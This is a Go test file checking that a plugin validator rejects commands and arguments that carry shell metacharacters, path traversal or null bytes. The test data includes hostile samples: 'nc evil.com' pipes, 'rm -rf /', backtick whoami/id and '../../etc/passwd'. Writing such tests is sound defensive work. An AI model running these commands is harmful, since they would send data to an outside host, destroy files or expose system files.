package hooks

import (
	"testing"
)

// --- validatePlugin: shell metacharacter rejection ---

func TestValidatePlugin_ShellMetachars(t *testing.T) {
	tests := []struct {
		name    string
		command string
	}{
		{"semicolon", "echo; rm -rf /"},
		{"pipe", "cat | nc evil.com 1234"},
		{"ampersand", "cmd & malicious"},
		{"dollar", "$HOME/exploit"},
		{"backtick", "`whoami`"},
		{"bang", "!history"},
		{"parens", "(subshell)"},
		{"braces", "{expansion}"},
		{"angle brackets", "<input>output"},
		{"backslash", "cmd\\arg"},
		{"newline", "cmd\nrm -rf /"},
		{"carriage return", "cmd\rmalicious"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			p := PluginConfig{
				Name:    "test",
				Command: tt.command,
				Enabled: true,
			}
			if err := validatePlugin(p); err == nil {
				t.Errorf("expected error for shell metachar command %q", tt.command)
			}
		})
	}
}

// --- validatePlugin: path traversal in command ---

func TestValidatePlugin_PathTraversal(t *testing.T) {
	tests := []struct {
		name    string
		command string
	}{
		{"parent dir", "../malicious"},
		{"deep traversal", "../../etc/passwd"},
		{"mid-path", "safe/../../../exploit"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			p := PluginConfig{
				Name:    "test",
				Command: tt.command,
				Enabled: true,
			}
			if err := validatePlugin(p); err == nil {
				t.Errorf("expected error for path traversal command %q", tt.command)
			}
		})
	}
}

// --- validatePlugin: null bytes ---

func TestValidatePlugin_NullBytes(t *testing.T) {
	tests := []struct {
		name string
		p    PluginConfig
	}{
		{
			"null in command",
			PluginConfig{Name: "test", Command: "safe\x00evil", Enabled: true},
		},
		{
			"null in arg",
			PluginConfig{Name: "test", Command: "echo", Args: []string{"safe\x00evil"}, Enabled: true},
		},
		{
			"null in second arg",
			PluginConfig{Name: "test", Command: "echo", Args: []string{"ok", "bad\x00"}, Enabled: true},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if err := validatePlugin(tt.p); err == nil {
				t.Errorf("expected error for null byte in %s", tt.name)
			}
		})
	}
}

// --- validatePlugin: empty command ---

func TestValidatePlugin_EmptyCommandSecurity(t *testing.T) {
	p := PluginConfig{Name: "test", Command: "", Enabled: true}
	if err := validatePlugin(p); err == nil {
		t.Error("expected error for empty command")
	}
}

// --- validatePlugin: relative path with separators ---

func TestValidatePlugin_RelativePathWithSeparators(t *testing.T) {
	tests := []string{
		"subdir/command",
		"path/to/script",
	}
	for _, cmd := range tests {
		p := PluginConfig{Name: "test", Command: cmd, Enabled: true}
		if err := validatePlugin(p); err == nil {
			t.Errorf("expected error for relative path with separator: %q", cmd)
		}
	}
}

// --- validatePlugin: arg shell metacharacters ---

func TestValidatePlugin_ArgShellMetachars(t *testing.T) {
	tests := []struct {
		name string
		arg  string
	}{
		{"semicolon", "--flag; rm -rf /"},
		{"pipe", "value | nc evil.com"},
		{"dollar", "$HOME"},
		{"backtick", "`id`"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			p := PluginConfig{
				Name:    "test",
				Command: "echo",
				Args:    []string{tt.arg},
				Enabled: true,
			}
			if err := validatePlugin(p); err == nil {
				t.Errorf("expected error for shell metachar in arg %q", tt.arg)
			}
		})
	}
}

// --- validatePlugin: arg path traversal ---

func TestValidatePlugin_ArgPathTraversal(t *testing.T) {
	p := PluginConfig{
		Name:    "test",
		Command: "echo",
		Args:    []string{"../../etc/passwd"},
		Enabled: true,
	}
	if err := validatePlugin(p); err == nil {
		t.Error("expected error for path traversal in arg")
	}
}

// --- validatePlugin: safe command names ---

func TestValidatePlugin_SafeCommandNamesSecurity(t *testing.T) {
	// These should pass command name validation (but may fail LookPath)
	tests := []string{
		"python3",
		"my-plugin",
		"script.sh",
		"node",
	}
	for _, cmd := range tests {
		p := PluginConfig{Name: "test", Command: cmd, Enabled: true}
		err := validatePlugin(p)
		// Should not fail on command name validation — may fail on LookPath
		if err != nil && err.Error() != "command not found in PATH: "+cmd {
			t.Errorf("unexpected validation error for safe command %q: %v", cmd, err)
		}
	}
}

// --- validatePlugin: invalid command name characters ---

func TestValidatePlugin_InvalidCommandChars(t *testing.T) {
	tests := []string{
		"cmd with spaces",
		"cmd@host",
		"cmd#tag",
		"cmd%encoded",
	}
	for _, cmd := range tests {
		p := PluginConfig{Name: "test", Command: cmd, Enabled: true}
		if err := validatePlugin(p); err == nil {
			t.Errorf("expected error for invalid command name %q", cmd)
		}
	}
}

// --- maxPluginOutput constant ---

func TestMaxPluginOutput_Reasonable(t *testing.T) {
	if maxPluginOutput != 1024*1024 {
		t.Errorf("expected maxPluginOutput to be 1MB, got %d", maxPluginOutput)
	}
}
